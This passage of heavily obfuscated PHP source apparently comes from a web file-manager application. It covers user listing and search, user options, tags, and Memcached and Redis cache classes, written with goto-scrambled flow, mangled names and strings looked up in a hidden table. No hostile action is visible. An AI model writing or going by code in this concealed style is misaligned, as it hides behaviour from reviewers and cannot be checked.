$this->_listDataApply($E∂ÓäÆŒõÑ[$_SERVER[∞„˜ƒÑºª][354]]); return $E∂ÓäÆŒõÑ; } public function listByID($aÍ÷Û¯ñ∞î) { $c≥ô‰ïúå› =& $_SERVER[∞„˜ƒÑºª]; if (!$aÍ÷Û¯ñ∞î) { return; } $aﬁü•∑Ÿ…Ë = array($c≥ô‰ïúå›[1063] => array($c≥ô‰ïúå›[7], $aÍ÷Û¯ñ∞î)); $E∂ÇËŸÒÃÜ = $this->where($aﬁü•∑Ÿ…Ë)->select(); $this->_listDataApply($E∂ÇËŸÒÃÜ); return $E∂ÇËŸÒÃÜ; } public function listByGroup($bÖÂòõ√≠Î = 0, $eÚàÍŒ°Ìù = array()) { goto d‰Ê¢†ôÁª; aÜ∞¥â∆Øª: return $búè§Í”åî; goto B°Ö†çŸºˆ; eõ’¡¥ñÉÜ: $c„œÛ—Ωﬁ¨ = array(); if ($bÖÂòõ√≠Î) { $c„œÛ—Ωﬁ¨ = array($fÕ•èÖ„§[1901] => intval($bÖÂòõ√≠Î)); $aÜâûü˘˜¡ = "\x4c\x45\x46\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\165\163\145\162\x5f\147\x72\x6f\165\160\40\x75\x73\x65\162\137\147\162\157\x75\x70\40\157\156\40\165\x73\x65\162\56\x75\x73\x65\x72\111\x44\x20\75\40\165\163\145\162\137\147\162\157\165\x70\56\x75\163\145\x72\111\104"; $bµœ§¯å≠¢ = Input::get($fÕ•èÖ„§[1556], null, $fÕ•èÖ„§[33]) ? $fÕ•èÖ„§[33] : $fÕ•èÖ„§[1902]; } if (isset($eÚàÍŒ°Ìù[$fÕ•èÖ„§[445]])) { $c„œÛ—Ωﬁ¨[$fÕ•èÖ„§[1903]] = $eÚàÍŒ°Ìù[$fÕ•èÖ„§[445]]; } goto F‘ùﬁø€îˆ; d‰Ê¢†ôÁª: $fÕ•èÖ„§ =& $_SERVER[∞„˜ƒÑºª]; $aéÎ±Î„• = isset($eÚàÍŒ°Ìù[$fÕ•èÖ„§[1900]]) ? $eÚàÍŒ°Ìù[$fÕ•èÖ„§[1900]] : $fÕ•èÖ„§[33]; $aÜâûü˘˜¡ = $fÕ•èÖ„§[33]; goto eõ’¡¥ñÉÜ; F‘ùﬁø€îˆ: $búè§Í”åî = $this->_makeOrder($bµœ§¯å≠¢)->field($fÕ•èÖ„§[1904])->where($c„œÛ—Ωﬁ¨)->join($aÜâûü˘˜¡)->selectPage(50); $Aê“ßöóà¬ = $fÕ•èÖ„§[731] . ($aéÎ±Î„• ? $fÕ•èÖ„§[47] . $aéÎ±Î„• : $fÕ•èÖ„§[33]); $this->_listDataApply($búè§Í”åî[$fÕ•èÖ„§[354]], $Aê“ßöóà¬); goto aÜ∞¥â∆Øª; B°Ö†çŸºˆ: } private function _makeOrder($FàÁÁÇ‡»¡ = '') { goto D≤ıääë≤å; f∂·ñÚ–¨≈: $B®ÂÆåµŒÎ = Input::get($aÛ€Êáº§É[1556], $aÛ€Êáº§É[7], $aÛ€Êáº§É[1054], $FÁúàóæ‘õ); $FÎ§É€ÉÇÆ = Input::get($aÛ€Êáº§É[1558], $aÛ€Êáº§É[7], $aÛ€Êáº§É[1603], array($aÛ€Êáº§É[1603], $aÛ€Êáº§É[1484])); $FÎ§É€ÉÇÆ = $b‚∆ÏëÒ™Ó[$FÎ§É€ÉÇÆ]; goto CÖèù’Ω‰ï; CÖèù’Ω‰ï: $FàÁÁÇ‡»¡ = $FàÁÁÇ‡»¡ . "\x75\163\x65\x72\56{$B®ÂÆåµŒÎ}\x20{$FÎ§É€ÉÇÆ}\x2c\40\165\x73\145\x72\x2e\165\x73\145\162\x49\104\40\141\x73\x63"; return $this->alias($aÛ€Êáº§É[1676])->order($FàÁÁÇ‡»¡); goto cÚ¡Ωå€‡≤; D≤ıääë≤å: $aÛ€Êáº§É =& $_SERVER[∞„˜ƒÑºª]; $FÁúàóæ‘õ = array($aÛ€Êáº§É[1063], $aÛ€Êáº§É[28], $aÛ€Êáº§É[1502], $aÛ€Êáº§É[1476], $aÛ€Êáº§É[183]); $b‚∆ÏëÒ™Ó = array($aÛ€Êáº§É[1601] => $aÛ€Êáº§É[1602], $aÛ€Êáº§É[1484] => $aÛ€Êáº§É[1560]); goto f∂·ñÚ–¨≈; cÚ¡Ωå€‡≤: } public function listSearch($aà¶·Ω´‹) { goto f‚≤™≥§±∫; Aû÷çê∫ÉË: if (!$bËéÙçŸ∫â || count($bËéÙçŸ∫â[$bÕÒÉ∑Âøß[354]]) < 5 && Input::check($F≤√∆É≥Û∞, $bÕÒÉ∑Âøß[305])) { $CÏé◊ÙÀÉô = $this->_searchFromMeta($bÕÒÉ∑Âøß[405], $F≤√∆É≥Û∞, 10); $e•≈èÖÒ¢Õ = $this->_searchFromMeta($bÕÒÉ∑Âøß[404], $F≤√∆É≥Û∞, 10); $bÏß¥È†∫ã = array_merge($CÏé◊ÙÀÉô, $e•≈èÖÒ¢Õ, $bËéÙçŸ∫â[$bÕÒÉ∑Âøß[354]]); $bËéÙçŸ∫â[$bÕÒÉ∑Âøß[354]] = array_unique_by_key($bÏß¥È†∫ã, $bÕÒÉ∑Âøß[1063]); $bËéÙçŸ∫â[$bÕÒÉ∑Âøß[351]][$bÕÒÉ∑Âøß[352]] = count($bËéÙçŸ∫â[$bÕÒÉ∑Âøß[354]]); $bËéÙçŸ∫â[$bÕÒÉ∑Âøß[351]][$bÕÒÉ∑Âøß[353]] = ceil($bËéÙçŸ∫â[$bÕÒÉ∑Âøß[351]][$bÕÒÉ∑Âøß[352]] / $bËéÙçŸ∫â[$bÕÒÉ∑Âøß[351]][$bÕÒÉ∑Âøß[349]]); } $this->_listDataApply($bËéÙçŸ∫â[$bÕÒÉ∑Âøß[354]]); $this->_filterByGroup($bËéÙçŸ∫â, $DçÒ¯é•≠Õ); goto D¡ø√Üö”´; CÇ∑ÕΩÌ’Â: if (!$F≤√∆É≥Û∞) { $eæîáØª©® = array(); } if (isset($aà¶·Ω´‹[$bÕÒÉ∑Âøß[445]])) { $eæîáØª©®[$bÕÒÉ∑Âøß[445]] = $aà¶·Ω´‹[$bÕÒÉ∑Âøß[445]]; } $bËéÙçŸ∫â = $this->_makeOrder()->where($eæîáØª©®)->selectPage(20); goto Aû÷çê∫ÉË; câπÇÜè¨∆: $F≤√∆É≥Û∞ = str_replace($bÕÒÉ∑Âøß[1606], $bÕÒÉ∑Âøß[1607], trim($F≤√∆É≥Û∞)); $eæîáØª©® = array($bÕÒÉ∑Âøß[28] => array($bÕÒÉ∑Âøß[519], "\x25{$F≤√∆É≥Û∞}\45"), $bÕÒÉ∑Âøß[292] => array($bÕÒÉ∑Âøß[519], "\45{$F≤√∆É≥Û∞}\45"), $bÕÒÉ∑Âøß[1846] => array($bÕÒÉ∑Âøß[519], "\x25{$F≤√∆É≥Û∞}\x25"), $bÕÒÉ∑Âøß[674] => $bÕÒÉ∑Âøß[1608]); if (Input::check($F≤√∆É≥Û∞, $bÕÒÉ∑Âøß[298])) { $eæîáØª©®[$bÕÒÉ∑Âøß[1063]] = array($bÕÒÉ∑Âøß[519], "\x25{$F≤√∆É≥Û∞}\x25"); $eæîáØª©®[$bÕÒÉ∑Âøß[1883]] = array($bÕÒÉ∑Âøß[519], "\45{$F≤√∆É≥Û∞}\x25"); } goto CÇ∑ÕΩÌ’Â; f‚≤™≥§±∫: $bÕÒÉ∑Âøß =& $_SERVER[∞„˜ƒÑºª]; $F≤√∆É≥Û∞ = $aà¶·Ω´‹[$bÕÒÉ∑Âøß[1604]]; $DçÒ¯é•≠Õ = isset($aà¶·Ω´‹[$bÕÒÉ∑Âøß[1605]]) ? $aà¶·Ω´‹[$bÕÒÉ∑Âøß[1605]] : !1; goto câπÇÜè¨∆; D¡ø√Üö”´: $this->_filterUserList($bËéÙçŸ∫â); return $bËéÙçŸ∫â; goto C∆–úíƒãÛ; C∆–úíƒãÛ: } private function _filterByGroup(&$d√§êä ÍØ, $C”äÉ–ñèË) { $a‰üè≥‚¿ï =& $_SERVER[∞„˜ƒÑºª]; if (!$C”äÉ–ñèË) { return $d√§êä ÍØ; } foreach ($d√§êä ÍØ[$a‰üè≥‚¿ï[354]] as $eµ™πË‚∫å => &$E›≠¿ãπ§å) { $d‹ﬂâ´©˜˘ = array_to_keyvalue($E›≠¿ãπ§å[$a‰üè≥‚¿ï[1905]], $a‰üè≥‚¿ï[33], $a‰üè≥‚¿ï[1516]); if (!in_array($C”äÉ–ñèË, $d‹ﬂâ´©˜˘)) { unset($d√§êä ÍØ[$a‰üè≥‚¿ï[354]][$eµ™πË‚∫å]); } } $d√§êä ÍØ[$a‰üè≥‚¿ï[354]] = array_values($d√§êä ÍØ[$a‰üè≥‚¿ï[354]]); $d√§êä ÍØ[$a‰üè≥‚¿ï[351]] = array($a‰üè≥‚¿ï[1906] => count($d√§êä ÍØ[$a‰üè≥‚¿ï[354]]), $a‰üè≥‚¿ï[1907] => $d√§êä ÍØ[$a‰üè≥‚¿ï[351]][$a‰üè≥‚¿ï[349]], $a‰üè≥‚¿ï[1908] => 1, $a‰üè≥‚¿ï[1909] => 1); } private function _filterUserList(&$D≠¯±áÆõü) { $d´îËÌ¢ß =& $_SERVER[∞„˜ƒÑºª]; foreach ($D≠¯±áÆõü[$d´îËÌ¢ß[354]] as $A‘Ñ⁄ó–‰ì => &$b√Ô≈·Ü∂Á) { unset($b√Ô≈·Ü∂Á[$d´îËÌ¢ß[1562]]); } } private function _searchFromMeta($få‰∂◊É™–, $cë∞∫¢§√Ø, $c§ﬁƒ„’ò–) { goto fËÑÀ“æáë; a¨°éŒ°¬Ì: $C‡Ñ ºÇò» = $this->where(array($CÏÇ◊áüÎÏ[1054] => array($CÏÇ◊áüÎÏ[7], $a⁄¯ŸÌ≥∫â)))->select(); if (!$C‡Ñ ºÇò») { return array(); } return $C‡Ñ ºÇò»; goto E‹ˆ§é™ŒË; fËÑÀ“æáë: $CÏÇ◊áüÎÏ =& $_SERVER[∞„˜ƒÑºª]; $cë∞∫¢§√Ø = strtolower($cë∞∫¢§√Ø); $BÑß©¡—èï = array($CÏÇ◊áüÎÏ[96] => $få‰∂◊É™–, $CÏÇ◊áüÎÏ[357] => array($CÏÇ◊áüÎÏ[519], "\x25{$cë∞∫¢§√Ø}\45")); goto FìÎ⁄€Ó≤Ï; FìÎ⁄€Ó≤Ï: $a⁄¯ŸÌ≥∫â = Model($CÏÇ◊áüÎÏ[1910])->where($BÑß©¡—èï)->limit($c§ﬁƒ„’ò–)->select(); if (!$a⁄¯ŸÌ≥∫â) { return array(); } $a⁄¯ŸÌ≥∫â = array_to_keyvalue($a⁄¯ŸÌ≥∫â, $CÏÇ◊áüÎÏ[33], $CÏÇ◊áüÎÏ[1063]); goto a¨°éŒ°¬Ì; E‹ˆ§é™ŒË: } private function _listDataApplyItem($D˜º˜ÖΩ‘ã) { $AåøÌùø◊à = array($D˜º˜ÖΩ‘ã); $this->_listDataApply($AåøÌùø◊à); return $AåøÌùø◊à[0]; } private function _listDataApply(&$B›…¢ó∏◊µ, $CÆÍ˘±øØî = "\x67\x72\x6f\165\x70\x2c\155\145\x74\141\54\x73\157\x75\162\143\145") { goto fúÑëÓ¶çÚ; fúÑëÓ¶çÚ: $D‚ì…ï”˜ì =& $_SERVER[∞„˜ƒÑºª]; if (!$B›…¢ó∏◊µ) { return; } array_remove_key($B›…¢ó∏◊µ, $D‚ì…ï”˜ì[561]); goto dÑ£–ÒèﬂÈ; f√ùıäá¶¢: if (in_array($D‚ì…ï”˜ì[1911], $CÆÍ˘±øØî)) { $this->_listAppendMeta($B›…¢ó∏◊µ, $eøâã Øò⁄); } if (in_array($D‚ì…ï”˜ì[954], $CÆÍ˘±øØî)) { $this->_listAppendSourceRoot($B›…¢ó∏◊µ, $eøâã Øò⁄); } goto aÆ„èìá‰º; dÑ£–ÒèﬂÈ: $eøâã Øò⁄ = array_to_keyvalue($B›…¢ó∏◊µ, $D‚ì…ï”˜ì[33], $D‚ì…ï”˜ì[1063]); $CÆÍ˘±øØî = explode($D‚ì…ï”˜ì[47], $CÆÍ˘±øØî); if (in_array($D‚ì…ï”˜ì[731], $CÆÍ˘±øØî)) { $this->_listAppendGroup($B›…¢ó∏◊µ, $eøâã Øò⁄); } goto f√ùıäá¶¢; aÆ„èìá‰º: } private function _listAppendSourceRoot(&$eÙØ˜™¨â≈, $AããÚüµ”∂) { $aÆ¿Ï‘ëÛ≥ =& $_SERVER[∞„˜ƒÑºª]; $e∂∫˘«Ô‡⁄ = array($aÆ¿Ï‘ëÛ≥[393] => SourceModel::TYPE_USER, $aÆ¿Ï‘ëÛ≥[384] => 0, $aÆ¿Ï‘ëÛ≥[395] => array($aÆ¿Ï‘ëÛ≥[7], $AããÚüµ”∂)); $A√ßÜØêÌæ = Model($aÆ¿Ï‘ëÛ≥[520])->field($aÆ¿Ï‘ëÛ≥[1912])->where($e∂∫˘«Ô‡⁄)->select(); $A√ßÜØêÌæ = array_to_keyvalue($A√ßÜØêÌæ, $aÆ¿Ï‘ëÛ≥[395]); $A√ßÜØêÌæ = array_remove_key($A√ßÜØêÌæ, $aÆ¿Ï‘ëÛ≥[395]); foreach ($eÙØ˜™¨â≈ as &$cÕπê∑õ±Í) { $cÕπê∑õ±Í[$aÆ¿Ï‘ëÛ≥[1618]] = $A√ßÜØêÌæ[$cÕπê∑õ±Í[$aÆ¿Ï‘ëÛ≥[1063]]] ? $A√ßÜØêÌæ[$cÕπê∑õ±Í[$aÆ¿Ï‘ëÛ≥[1063]]] : array(); } } private function _listAppendGroup(&$e©Á®≤•Ï÷, $f∑ÇÎ“–Üß) { goto eËç¬˘≠œö; AØ±‚Ñ´®˜: $EÀë•∆ ∞ = array_to_keyvalue_group($EÀë•∆ ∞, $FÚãúÌ’≈Ñ[1063]); foreach ($EÀë•∆ ∞ as &$eÁΩ≠€Û∫Á) { $b±≥ÙØÉè = array(); foreach ($eÁΩ≠€Û∫Á as $aƒ•‚ÏΩ‹–) { if (!$aƒ•‚ÏΩ‹–[$FÚãúÌ’≈Ñ[1652]]) { continue; } $A◊√ñÏæ∞ = Model($FÚãúÌ’≈Ñ[1658])->listData($aƒ•‚ÏΩ‹–[$FÚãúÌ’≈Ñ[1652]]); $b±≥ÙØÉè[] = array($FÚãúÌ’≈Ñ[1516] => $aƒ•‚ÏΩ‹–[$FÚãúÌ’≈Ñ[1516]], $FÚãúÌ’≈Ñ[1915] => $fÃ≠èÁé∑ñ[$aƒ•‚ÏΩ‹–[$FÚãúÌ’≈Ñ[1516]]], $FÚãúÌ’≈Ñ[548] => $A◊√ñÏæ∞); } $eÁΩ≠€Û∫Á = $b±≥ÙØÉè; } foreach ($e©Á®≤•Ï÷ as &$bÔåœ„Í∏’) { $bÔåœ„Í∏’[$FÚãúÌ’≈Ñ[1905]] = array(); if (isset($EÀë•∆ ∞[$bÔåœ„Í∏’[$FÚãúÌ’≈Ñ[1063]]])) { $bÔåœ„Í∏’[$FÚãúÌ’≈Ñ[1905]] = $EÀë•∆ ∞[$bÔåœ„Í∏’[$FÚãúÌ’≈Ñ[1063]]]; } } goto cÑäÆÀ™´≤; Bœ€•‰öÑ‰: $dîáôÕè©∆ = array_to_keyvalue($EÀë•∆ ∞, $FÚãúÌ’≈Ñ[33], $FÚãúÌ’≈Ñ[1516]); $dîáôÕè©∆ = array_remove_value(array_unique($dîáôÕè©∆), $FÚãúÌ’≈Ñ[402]); if (!$dîáôÕè©∆ || !$EÀë•∆ ∞) { return; } goto fë‡√ãëΩ†; eËç¬˘≠œö: $FÚãúÌ’≈Ñ =& $_SERVER[∞„˜ƒÑºª]; $F’æ§äı–à = array($FÚãúÌ’≈Ñ[1063] => array($FÚãúÌ’≈Ñ[7], $f∑ÇÎ“–Üß)); $EÀë•∆ ∞ = Model($FÚãúÌ’≈Ñ[1600])->where($F’æ§äı–à)->select(); goto Bœ€•‰öÑ‰; fë‡√ãëΩ†: $F’æ§äı–à = array($FÚãúÌ’≈Ñ[1516] => array($FÚãúÌ’≈Ñ[7], $dîáôÕè©∆)); $DáßÌ∑‘ç∑ = Model($FÚãúÌ’≈Ñ[1913])->field($FÚãúÌ’≈Ñ[1914])->where($F’æ§äı–à)->select(); $fÃ≠èÁé∑ñ = array_to_keyvalue($DáßÌ∑‘ç∑, $FÚãúÌ’≈Ñ[1516], $FÚãúÌ’≈Ñ[28]); goto AØ±‚Ñ´®˜; cÑäÆÀ™´≤: } private function _listAppendMeta(&$DæÊ¬≤¥Û, $b¿Ωä«Ã≈Ò) { goto C“ÍÊÿ±Ñ; bÈâ¯ç±ÏΩ: foreach ($eéÀ¡â¨À≥ as &$d¿µ∂¶ÀÇé) { $B®äƒÛ˘¨· = array(); foreach ($d¿µ∂¶ÀÇé as $DÎ–Ñü‚˘–) { if (!in_array($DÎ–Ñü‚˘–[$aÏöé√éñê[96]], $BŸ®≤È∫Ÿí)) { $B®äƒÛ˘¨·[$DÎ–Ñü‚˘–[$aÏöé√éñê[96]]] = $DÎ–Ñü‚˘–[$aÏöé√éñê[357]]; } } $d¿µ∂¶ÀÇé = $B®äƒÛ˘¨·; } $dê¬ùµ§ΩÓ = Model($aÏöé√éñê[1916]); foreach ($DæÊ¬≤¥Û as &$a◊ûëΩœ€†) { $a◊ûëΩœ€†[$aÏöé√éñê[1562]] = array(); $a◊ûëΩœ€†[$aÏöé√éñê[1917]] = array(); if (isset($eéÀ¡â¨À≥[$a◊ûëΩœ€†[$aÏöé√éñê[1063]]])) { $a◊ûëΩœ€†[$aÏöé√éñê[1562]] = $eéÀ¡â¨À≥[$a◊ûëΩœ€†[$aÏöé√éñê[1063]]]; } if (isset($a◊ûëΩœ€†[$aÏöé√éñê[1562]][$b–àôçÑæÂ])) { $a◊ûëΩœ€†[$aÏöé√éñê[1917]] = $dê¬ùµ§ΩÓ->getUserJobInfo($a◊ûëΩœ€†[$aÏöé√éñê[1562]][$b–àôçÑæÂ]); } } goto d„ÜÊ¬àﬂè; FÀé∑ÿè∂È: $B»≥“—Ì® = array($aÏöé√éñê[1063] => array($aÏöé√éñê[7], $b¿Ωä«Ã≈Ò)); $eéÀ¡â¨À≥ = Model($aÏöé√éñê[1882])->where($B»≥“—Ì®)->select(); $eéÀ¡â¨À≥ = array_to_keyvalue_group($eéÀ¡â¨À≥, $aÏöé√éñê[1063]); goto bÈâ¯ç±ÏΩ; C“ÍÊÿ±Ñ: $aÏöé√éñê =& $_SERVER[∞„˜ƒÑºª]; $b–àôçÑæÂ = UserJobModel::JOB_KEY; $BŸ®≤È∫Ÿí = array($aÏöé√éñê[1885]); goto FÀé∑ÿè∂È; d„ÜÊ¬àﬂè: } public function userSearch($b≠Áﬁ‰áç…, $FﬂÏãÎé≠ƒ = "\x2a") { return Model($_SERVER[∞„˜ƒÑºª][1451])->where($b≠Áﬁ‰áç…)->field($FﬂÏãÎé≠ƒ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($e™çã≈æ„é) { return "\x55\163\x65\162\117\160\x74\x69\157\x6e\137{$e™çã≈æ„é}\137" . USER_ID; } protected function filterWhere($A‘÷µüŒ†Í) { $A‘÷µüŒ†Í[$_SERVER[∞„˜ƒÑºª][1063]] = USER_ID; return $A‘÷µüŒ†Í; } public function get($a©’∑‰ó⁄¨ = false, $dëâêãÔî√ = '', $BØ™¢ Êº≥ = false) { goto A⁄⁄„ö®´È; A⁄⁄„ö®´È: $C¡˜·ÛêŸÈ =& $_SERVER[∞„˜ƒÑºª]; $CœñÑÿû§… = parent::get($a©’∑‰ó⁄¨, $dëâêãÔî√, $BØ™¢ Êº≥); if (!is_null($CœñÑÿû§…)) { return $CœñÑÿû§…; } goto f“ó˘ïﬂæ†; Eé‡ûé±¿˘: if (!$a©’∑‰ó⁄¨) { return $cÉ¡ŒÎÃ∆»; } else { return $cÉ¡ŒÎÃ∆»[$a©’∑‰ó⁄¨]; } goto f◊ª›£∑ÌÁ; f“ó˘ïﬂæ†: global $config; $D≤Ì‰„•Ö„ = array($C¡˜·ÛêŸÈ[33] => $C¡˜·ÛêŸÈ[1918], $C¡˜·ÛêŸÈ[1919] => $C¡˜·ÛêŸÈ[1920]); $cÉ¡ŒÎÃ∆» = $config[$D≤Ì‰„•Ö„[$dëâêãÔî√]]; goto Eé‡ûé±¿˘; f◊ª›£∑ÌÁ: } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\x2e\164\141\147\114\x69\x73\164"; public $modelType = "\x55\163\x65\x72\x4f\160\x74\x69\x6f\156"; public $field = array("\x6e\141\155\x65", "\163\x74\x79\154\145", "\163\157\x72\x74"); public function listData($F…ñÊŸ·Ãﬁ = false, $cïæí∏ÎÂé = "\163\x6f\162\x74", $eˆÖ¬πü•å = false) { return parent::listData($F…ñÊŸ·Ãﬁ, $cïæí∏ÎÂé, $eˆÖ¬πü•å); } public function remove($b„ã÷—◊ñ) { return parent::remove($b„ã÷—◊ñ); } public function add($B‹•Á∂èôÎ, $C¬ÖæÇ‘•≥ = "\154\141\x62\145\x6c\x2d\147\162\x65\x79\x2d\156\157\x72\x6d\141\154") { $có◊™Î©∞§ =& $_SERVER[∞„˜ƒÑºª]; if ($this->findByName($B‹•Á∂èôÎ)) { return !1; } $e°è∞Áëù¿ = array($có◊™Î©∞§[387] => $B‹•Á∂èôÎ, $có◊™Î©∞§[1921] => $C¬ÖæÇ‘•≥, $có◊™Î©∞§[1520] => $this->getSort($có◊™Î©∞§[245]) + 1); return parent::insert($e°è∞Áëù¿); } public function update($e°Ü≥∫œú‚, $EÆó¶£Î√) { $dÂÛ∏“ê”• =& $_SERVER[∞„˜ƒÑºª]; $A∞º´˘·’á = $this->listData($e°Ü≥∫œú‚); $B¢Ü∞∆ÕÓé = $this->findByName($EÆó¶£Î√[$dÂÛ∏“ê”•[28]]); if (!$A∞º´˘·’á || $B¢Ü∞∆ÕÓé && $B¢Ü∞∆ÕÓé[$dÂÛ∏“ê”•[366]] != $A∞º´˘·’á[$dÂÛ∏“ê”•[366]]) { return !1; } return parent::update($e°Ü≥∫œú‚, $EÆó¶£Î√); } public function moveTop($EÆÁØ¢åıì) { $AÏÚíóøû– =& $_SERVER[∞„˜ƒÑºª]; $b≈†≤‡ßé¥ = parent::listData(); $dé√£Ôú∞ë = $this->getSort($AÏÚíóøû–[244]); foreach ($b≈†≤‡ßé¥ as &$Eõ ‡æÈôé) { if ($Eõ ‡æÈôé[$AÏÚíóøû–[366]] == $EÆÁØ¢åıì) { $Eõ ‡æÈôé[$AÏÚíóøû–[1537]] = $dé√£Ôú∞ë; continue; } $Eõ ‡æÈôé[$AÏÚíóøû–[1537]] += 1; } return parent::resetData($b≈†≤‡ßé¥); } public function moveBottom($Bº»ê¨ûü´) { $DØé–’∑Á¿ =& $_SERVER[∞„˜ƒÑºª]; $FﬂÑòœ«∂© = $this->getSort($DØé–’∑Á¿[245]) + 1; return parent::update($Bº»ê¨ûü´, array($DØé–’∑Á¿[1537] => $FﬂÑòœ«∂©)); } public function resetSort($B÷ÖÃ¥´Œæ) { $e÷∆†è¯´Ú =& $_SERVER[∞„˜ƒÑºª]; $C ‚Öïè• = array(); for ($eÛÆ¢ÜﬁÊˆ = 0; $eÛÆ¢ÜﬁÊˆ < count($B÷ÖÃ¥´Œæ); $eÛÆ¢ÜﬁÊˆ++) { $C ‚Öïè•[$B÷ÖÃ¥´Œæ[$eÛÆ¢ÜﬁÊˆ] . $e÷∆†è¯´Ú[33]] = $eÛÆ¢ÜﬁÊˆ + 1; } $AπÍ≈ü∞Ô‘ = parent::listData(); foreach ($AπÍ≈ü∞Ô‘ as &$cìê ‘Éí‰) { $cçÆºÀ¶¢∞ = $C ‚Öïè•[$cìê ‘Éí‰[$e÷∆†è¯´Ú[366]]]; $cìê ‘Éí‰[$e÷∆†è¯´Ú[1537]] = $cçÆºÀ¶¢∞ ? $cçÆºÀ¶¢∞ : $cìê ‘Éí‰[$e÷∆†è¯´Ú[1537]]; } return parent::resetData($AπÍ≈ü∞Ô‘); } private function getSort($bÉÎâû–è) { $dåÀØõ…Œ∑ =& $_SERVER[∞„˜ƒÑºª]; $EÑÕƒÇ«åƒ = parent::listData(); $d©‡ìÂ«ÌÒ = array_to_keyvalue($EÑÕƒÇ«åƒ, $dåÀØõ…Œ∑[33], $dåÀØõ…Œ∑[1537]); if (!$d©‡ìÂ«ÌÒ) { $d©‡ìÂ«ÌÒ = array(0); } $a¿øÌñΩí“ = $bÉÎâû–è == $dåÀØõ…Œ∑[245] ? max($d©‡ìÂ«ÌÒ) : min($d©‡ìÂ«ÌÒ); return intval($a¿øÌñΩí“); } } goto EñøÈ¥ÙΩû; b¬”—®Æûı: class CacheMemcached { public $handle; public $cacheTime; public function __construct($cø™‘ó◊∏¡, $D∂ﬂ ÙßßΩ) { $fæ´¥´âõ´ =& $_SERVER[∞„˜ƒÑºª]; if (!class_exists($fæ´¥´âõ´[541])) { show_json($fæ´¥´âõ´[542], !1); } $this->cacheTime = $D∂ﬂ ÙßßΩ; $this->handle = new Memcached(); if (is_array($cø™‘ó◊∏¡[$fæ´¥´âõ´[543]]) && count($cø™‘ó◊∏¡[$fæ´¥´âõ´[543]]) >= 1) { foreach ($cø™‘ó◊∏¡[$fæ´¥´âõ´[543]] as $BŸœ˘ÈÚ≤‘) { $B–‡ÿ‹úÎ’ = explode($fæ´¥´âõ´[4], $BŸœ˘ÈÚ≤‘); $this->handle->addServer($B–‡ÿ‹úÎ’[0], $B–‡ÿ‹úÎ’[1]); } } else { $this->handle->addServer($cø™‘ó◊∏¡[$fæ´¥´âõ´[165]], $cø™‘ó◊∏¡[$fæ´¥´âõ´[166]]); } } public function set($C’≈ÖÓºÛû, $C¶ˆ¢çå’ñ, $CíåÉûú“ú = false) { $CíåÉûú“ú = $CíåÉûú“ú ? $CíåÉûú“ú : $this->cacheTime; return $this->handle->set($C’≈ÖÓºÛû, $C¶ˆ¢çå’ñ, $CíåÉûú“ú); } public function get($fßßå©ãÙà) { return $this->handle->get($fßßå©ãÙà); } public function remove($E˘ô˜‡•èã) { return $this->handle->delete($E˘ô˜‡•èã); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public function __construct($d¿éî∑Ëˆñ, $bàø≈üàﬂÂ) { $cÕﬁÆ°÷Í√ =& $_SERVER[∞„˜ƒÑºª]; if (!class_exists($cÕﬁÆ°÷Í√[544])) { show_json($cÕﬁÆ°÷Í√[545], !1); } $this->cacheTime = $bàø≈üàﬂÂ; $Aõ∆÷∫„∞° = isset($d¿éî∑Ëˆñ[$cÕﬁÆ°÷Í√[546]]) ? $d¿éî∑Ëˆñ[$cÕﬁÆ°÷Í√[546]] : 10; if (is_array($d¿éî∑Ëˆñ[$cÕﬁÆ°÷Í√[543]]) && count($d¿éî∑Ëˆñ[$cÕﬁÆ°÷Í√[543]]) >= 1) { $this->initCluster($d¿éî∑Ëˆñ, $Aõ∆÷∫„∞°); } else { $this->handle = $this->init($d¿éî∑Ëˆñ, $Aõ∆÷∫„∞°); } } private function init($E≥˜ƒ¬Õú“, $c¥≤∑Ç®∞÷) { $DœÊÆ†±êê =& $_SERVER[∞„˜ƒÑºª]; $e••ƒÛÓ˘û = new Redis(); $FÌ’ò¡à∫ö = isset($E≥˜ƒ¬Õú“[$DœÊÆ†±êê[547]]) ? $E≥˜ƒ¬Õú“[$DœÊÆ†±êê[547]] : !1; if ($FÌ’ò¡à∫ö) { $e••ƒÛÓ˘û->pconnect($E≥˜ƒ¬Õú“[$DœÊÆ†±êê[165]], $E≥˜ƒ¬Õú“[$DœÊÆ†±êê[166]], $c¥≤∑Ç®∞÷); } else { $e••ƒÛÓ˘û->connect($E≥˜ƒ¬Õú“[$DœÊÆ†±êê[165]], $E≥˜ƒ¬Õú“[$DœÊÆ†±êê[166]], $c¥≤∑Ç®∞÷); } if (!empty($E≥˜ƒ¬Õú“[$DœÊÆ†±êê[548]])) { $e••ƒÛÓ˘û->auth($E≥˜ƒ¬Õú“[$DœÊÆ†±êê[548]]); } return $e••ƒÛÓ˘û; } private function initCluster($e˜πÉò€çÍ, $bÍ¿‘ÒÑ—–) { $c±Û·ÂÃ·∞ =& $_SERVER[∞„˜ƒÑºª]; $AßøÚç£ìà = array($c±Û·ÂÃ·∞[549], $c±Û·ÂÃ·∞[550], $c±Û·ÂÃ·∞[551]); $e≥Á‡≈üŸÏ = $c±Û·ÂÃ·∞[549]; if (isset($e˜πÉò€çÍ[$c±Û·ÂÃ·∞[12]]) && in_array($e˜πÉò€çÍ[$c±Û·ÂÃ·∞[12]], $AßøÚç£ìà)) { $e≥Á‡≈üŸÏ = $e˜πÉò€çÍ[$c±Û·ÂÃ·∞[12]]; } switch ($e≥Á‡≈üŸÏ) { case $c±Û·ÂÃ·∞[549]: $this->_slave($e˜πÉò€çÍ, $bÍ¿‘ÒÑ—–); break; case $c±Û·ÂÃ·∞[550]: break; case $c±Û·ÂÃ·∞[551]: $f»ÜÈº˜ú« = $e˜πÉò€çÍ[$c±Û·ÂÃ·∞[543]]; $bá§…Ñî±‘ = isset($e˜πÉò€çÍ[$c±Û·ÂÃ·∞[547]]) ? $e˜πÉò€çÍ[$c±Û·ÂÃ·∞[547]] : !1; $eº¶◊ç£Ì∫ = isset($e˜πÉò€çÍ[$c±Û·ÂÃ·∞[548]]) ? $e˜πÉò€çÍ[$c±Û·ÂÃ·∞[548]] : null; $this->handle = new RedisCluster(NUll, $f»ÜÈº˜ú«, $bÍ¿‘ÒÑ—–, $bÍ¿‘ÒÑ—–, 